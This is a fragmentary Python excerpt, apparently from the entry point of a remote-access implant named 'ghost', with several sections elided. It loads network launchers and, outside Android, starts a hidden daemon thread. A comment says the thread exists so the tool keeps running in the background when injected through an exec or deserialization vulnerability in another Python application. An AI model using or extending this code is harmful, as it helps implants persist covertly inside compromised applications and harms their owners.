...
from . import main
setattr(sys, '__ghost_main__', True)
...
import ghost.ghostlib
assert(ghost.ghostlib)

from ghost.network.conf import launchers

parser = argparse.ArgumentParser('ghost')
parser.add_argument(
...
if __debug__:
    ...
    if not platform.system() == 'android':
        if not hasattr(platform, 'ghost_thread'):
            # to allow ghost to run in background when imported or injected
            # through a python application exec/deserialization vulnerability
            t = threading.Thread(target=main)
            t.daemon = True
            t.start()
            setattr(platform, 'ghost_thread', t)
